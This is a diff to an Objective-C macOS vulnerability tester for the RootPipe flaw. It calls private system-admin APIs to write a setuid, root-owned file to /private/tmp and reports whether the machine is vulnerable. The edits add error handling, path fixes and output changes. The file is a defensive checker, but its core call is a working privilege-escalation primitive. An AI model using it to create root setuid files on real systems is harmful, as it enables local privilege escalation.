@@ -29,8 +29,8 @@ static Class Authenticator = nil;
 static Class WriteConfigClient = nil;
 static Class ToolLiaison = nil;
 
-static NSString * const FILE_PATH_FMT = @"/tmp/rootpipe_tester_%@.txt";
-NSString *FILE_PATH = @"/tmp/rootpipe_tester.txt"; // value will get replaced in +initialize
+static NSString * const FILE_PATH_FMT = @"/private/tmp/rootpipe_tester_%@.txt";
+NSString *FILE_PATH = @"/private/tmp/rootpipe_tester.txt"; // value will get replaced in +initialize
 static NSMutableArray *usedTempFiles = nil;
 
 @implementation RootPipeDelegate
@@ -118,13 +118,13 @@ static NSMutableArray *usedTempFiles = nil;
 								   self, 
 								   NULL, @selector(sheetDidDismiss:returnCode:contextInfo:), 
 								   @"StartTestDialog", 
-								   @"By clicking the \"Start Test\" button you agree that this test will try to make use of a vulnerability in Mac OS X to write a file owned by root:wheel to your /tmp directory.\nIf you don't agree with that, please click \"Cancel\" now.\n\nNOTE: If you're being asked to enter a password, please Cancel the dialog."
+								   @"By clicking the \"Start Test\" button you agree that this test will try to make use of a vulnerability in Mac OS X to write a file owned by root:wheel to your /private/tmp directory.\nIf you don't agree with that, please click \"Cancel\" now.\n\nNOTE: If you're being asked to enter a password, please Cancel the dialog."
 								   );
 }
 
 - (void)sheetDidDismiss:(NSWindow *)sheet returnCode:(int)returnCode contextInfo:(NSString *)contextInfo {
 	if (![contextInfo isKindOfClass:[NSString class]]) return;
-
+	
 	if ([contextInfo isEqualToString:@"StartTestDialog"]) {
 		if (returnCode == NSAlertDefaultReturn /* Start Test */) {
 			// Start the test
@@ -139,7 +139,7 @@ static NSMutableArray *usedTempFiles = nil;
 		if (returnCode == NSAlertDefaultReturn /* Clean Up */) {
 			// Clean up
 			[self cleanUp];
-
+			
 			if ([usedTempFiles count] > 0) {
 				NSLog(@"Clean up didn't work 100 percent correctly. Please run the following command from your Terminal to remove the testing files: sudo rm -iv -- /tmp/rootpipe_tester*;");
 			}
@@ -166,41 +166,32 @@ static NSMutableArray *usedTempFiles = nil;
 
 - (id)getTool:(BOOL)useAuth {
 	// This is where the magic happens
-	
-	SFAuthorization *auth = [SFAuthorization authorization];
 	id tool = nil;
 	
-	switch ([self apiVersion]) {
-		case RootPipeNewApi: {
-			id sharedClient = [WriteConfigClient sharedClient];
-			[sharedClient authenticateUsingAuthorizationSync:(useAuth ? auth : nil)];
-			tool = [sharedClient remoteProxy];
-			break;
+	@try {
+		SFAuthorization *auth = [SFAuthorization authorization];
+		
+		switch ([self apiVersion]) {
+			case RootPipeNewApi: {
+				id sharedClient = [WriteConfigClient sharedClient];
+				[sharedClient authenticateUsingAuthorizationSync:(useAuth ? auth : nil)];
+				tool = [sharedClient remoteProxy];
+				break;
+			}
+			case RootPipeOldApi: {
+				id authenticator = [Authenticator sharedAuthenticator];
+				[authenticator authenticateUsingAuthorizationSync:(useAuth ? auth : nil)];
+				id sharedLiaison = [ToolLiaison sharedToolLiaison];
+				tool = [sharedLiaison tool];			
+				break;
+			}
+			default:
+				break;
 		}
-		case RootPipeOldApi: {
-			id authenticator = [Authenticator sharedAuthenticator];
-			[authenticator authenticateUsingAuthorizationSync:(useAuth ? auth : nil)];
-			id sharedLiaison = [ToolLiaison sharedToolLiaison];
-			tool = [sharedLiaison tool];
-						
-//			pthread_attr_t attr;
-//			pthread_t posixThreadID;
-//			int returnVal;
-//			
-//			returnVal = pthread_attr_init(&attr);
-//			returnVal = pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_JOINABLE);
-//			int threadError = pthread_create(&posixThreadID, &attr, &PosixThreadMainRoutine, NULL);
-//			
-//			pthread_attr_destroy(&attr);
-//			
-//			if (threadError != 0) {
-//				// Report an error.
-//			}			
-			
-			break;
-		}
-		default:
-			break;
+		
+	}
+	@catch (NSException *e) {
+		fprintf(stderr, "An %s was raised while trying to get tool: %s\n", [[e name] UTF8String], [[e reason] UTF8String]);
 	}
 	
 	return tool;
@@ -220,7 +211,7 @@ static NSMutableArray *usedTempFiles = nil;
 	NSData * const FILE_CONTENTS = [@"VULNERABLE" dataUsingEncoding:NSASCIIStringEncoding];
 	
 	// Unset fileAttr so that in case the system is not vulnerable, the dictionary will be empty as it should
-	if (*fileAttr) *fileAttr = nil; // TODO: Should this get autoreleased?
+	if (*fileAttr) *fileAttr = nil;
 	
 	printf("Running RootPipe Test %s user authorization\n", (useAuth ? "with" : "without"));
 	if([self testFileExists]) printf("The file \"%s\" already exists. This might have an effect on the test result!\n", [FILE_PATH UTF8String]);
@@ -228,7 +219,7 @@ static NSMutableArray *usedTempFiles = nil;
 	// Get Tool
 	printf("Trying to get tool…\n");
 	id tool = [self getTool:useAuth];
-	if ([tool respondsToSelector:@selector(description)]) {
+	if ([tool respondsToSelector:@selector(description)] || tool == nil) {
 		printf("Tool is: %s\n", [[tool description] UTF8String]);
 	} else {
 		// Fix for OS X 10.8 where NSDistantObject does not respond to description
@@ -236,15 +227,19 @@ static NSMutableArray *usedTempFiles = nil;
 	}
 	
 	// Try to write file
-	[tool createFileWithContents:FILE_CONTENTS 
-							path:FILE_PATH 
-					  attributes:[NSDictionary dictionaryWithObjectsAndKeys:
-								  [NSNumber numberWithUnsignedShort /* maybe unsigned long should be used here... */ :04777], NSFilePosixPermissions, 
-								  @"root", NSFileOwnerAccountName, 
-								  @"wheel", NSFileGroupOwnerAccountName, 
-								  nil
-								]
-	 ];
+	BOOL createResult = [tool createFileWithContents:FILE_CONTENTS 
+												path:FILE_PATH 
+										  attributes:[NSDictionary dictionaryWithObjectsAndKeys:
+													  [NSNumber numberWithUnsignedShort /* maybe unsigned long should be used here... */ :04777], NSFilePosixPermissions, 
+													  @"root", NSFileOwnerAccountName, 
+													  @"wheel", NSFileGroupOwnerAccountName, 
+													  nil
+													  ]
+						 ];
+	
+	if (!createResult) {
+		printf("The tool indicates that writing the file \"%s\" failed.", FILE_PATH);
+	}
 	
 	// Check if it worked
 	NSFileManager *fm = [NSFileManager defaultManager];
@@ -264,12 +259,12 @@ static NSMutableArray *usedTempFiles = nil;
 	} else {
 		printf("The contents of the file match what we tried to write.\n");
 	}
-
+	
 	NSDictionary *writtenFileAttributes = [fm fileAttributesAtPath:FILE_PATH traverseLink:YES]; // need to traverse link because on some systems /tmp is /private/tmp
-
+	
 	// "Export" file attributes
 	if (fileAttr) {
-		*fileAttr = [NSDictionary dictionaryWithDictionary:writtenFileAttributes]; // TODO: Check pointer before dereferencing…
+		*fileAttr = [NSDictionary dictionaryWithDictionary:writtenFileAttributes];
 	}
 	
 	NSString *writtenFilePermissions = [NSString stringWithFormat:@"%o", [(NSNumber *)[writtenFileAttributes objectForKey:NSFilePosixPermissions] shortValue]]; // octal permissions
@@ -280,6 +275,8 @@ static NSMutableArray *usedTempFiles = nil;
 		[writtenFilePermissions isEqualToString:@"4777"]
 		) {
 		return YES; // You are vulnerable :(
+	} else {
+		printf("The file attributes are not what they're expected to be.\n");
 	}
 	
 	return NO; // by defaults assume all's good :)
@@ -299,13 +296,13 @@ static NSMutableArray *usedTempFiles = nil;
 	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
 	
 	[[NSNotificationCenter defaultCenter] postNotificationName:RootPipeTestStarted object:NSApp];
-		
+	
 	// Redirect stdout and stderr to the TextView
 	int oldStdOut = dup(fileno(stdout)); // make a copy of the old outs to restore later
 	int oldStdErr = dup(fileno(stderr));
 	
-	setvbuf(stdout, NULL, _IONBF /* No Buffering */, BUFSIZ);
-	setvbuf(stderr, NULL, _IONBF /* No Buffering */, BUFSIZ);
+	setvbuf(stdout, NULL, _IOLBF /* Line Buffering */, BUFSIZ);
+	setvbuf(stderr, NULL, _IOLBF /* Line Buffering */, BUFSIZ);
 	
 	NSPipe *pipe = [NSPipe pipe];
 	NSFileHandle *pipeHandle = [pipe fileHandleForReading];
@@ -324,31 +321,39 @@ static NSMutableArray *usedTempFiles = nil;
 		   [(NSString *)[systemVersion objectForKey:@"ProductName"] UTF8String], 
 		   [(NSString *)[systemVersion objectForKey:@"ProductVersion"] UTF8String], 
 		   [(NSString *)[systemVersion objectForKey:@"ProductBuildVersion"] UTF8String]
-	);
+		   );
 	printf("Appropriate API version for your system: %s\n", ([self apiVersion] == RootPipeNewApi ? "New API" : "Old API"));
 	printf("\n");
 	
 	// Run tests
 	NSDictionary *fileAttributes = nil;
 	
+	// [nil auth]
 	BOOL vulnerableWithoutAuth = [self runTestWithAuthorization:NO fileAttributes:&fileAttributes]; // nil auth test
 	if (vulnerableWithoutAuth) {
 		printf("Your system is vulnerable with nil authorization! (probably 10.9.0 - 10.10.2)\n");
-		printf("File attributes: %s\n", [[fileAttributes descriptionWithLocale:nil indent:1] UTF8String]);
 	} else {
 		printf("Your system is not vulnerable with nil authorization. (probably 10.8 or older)\n");
 	}
+	if (fileAttributes) {
+		printf("File attributes: %s\n", [[fileAttributes descriptionWithLocale:nil indent:1] UTF8String]);
+	}
+	// [/nil auth]
 	
 	[self switchTempFile];
 	printf("\n");
 	
+	// [user auth]
 	BOOL vulnerableWithAuth = [self runTestWithAuthorization:YES fileAttributes:&fileAttributes]; // user auth test
 	if (vulnerableWithAuth) {
 		printf("Your system is vulnerable with user authorization. Are you a \"Standard User\" or did you enter your password?\n");
-		printf("File attributes: %s\n", [[fileAttributes descriptionWithLocale:nil indent:1] UTF8String]);
 	} else {
 		printf("Your system is not vulnerable using user authorization.\n");
 	}
+	if (fileAttributes) {
+		printf("File attributes: %s\n", [[fileAttributes descriptionWithLocale:nil indent:1] UTF8String]);
+	}
+	// [/user auth]
 	
 	@synchronized(usedTempFiles) {
 		printf("\nTried to write the following files: %s\n", [[usedTempFiles descriptionWithLocale:nil indent:1] UTF8String]);
@@ -361,7 +366,7 @@ static NSMutableArray *usedTempFiles = nil;
 	fflush(stderr);
 	dup2(oldStdErr, fileno(stderr));
 	close(oldStdErr);
-
+	
 	// Make sure that all the contents of the redirected "test buffers" are in the TextView
 	[[NSNotificationCenter defaultCenter] postNotification:
 	 [NSNotification notificationWithName:NSFileHandleReadCompletionNotification 
@@ -370,9 +375,9 @@ static NSMutableArray *usedTempFiles = nil;
 										   [pipeHandle availableData], NSFileHandleNotificationDataItem, 
 										   [NSNumber numberWithInt:0], @"NSFileHandleError", 
 										   nil
-										  ]
-	 ]
-	];
+										   ]
+	  ]
+	 ];
 	
 	// Test finished
 	[[NSNotificationCenter defaultCenter] postNotificationName:RootPipeTestFinished object:NSApp];
@@ -386,11 +391,12 @@ static NSMutableArray *usedTempFiles = nil;
 	NSData *data = (NSData *)[(NSDictionary *)[notification userInfo] objectForKey:NSFileHandleNotificationDataItem];
 	NSString *str = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
 	
-	NSAttributedString *attributedString = [[NSAttributedString alloc] initWithString:str];
+	if ([str length] < 1) return; // nothing to fill into TextView
+	
+	NSAttributedString *attributedString = [[[NSAttributedString alloc] initWithString:str] autorelease];
 	// Asynchronously update TextView on the GUI thread.
 	[[textOutput textStorage] performSelectorOnMainThread:@selector(appendAttributedString:) withObject:attributedString waitUntilDone:NO];
-
-	[attributedString release];
+	
 	[str release];
 }
 
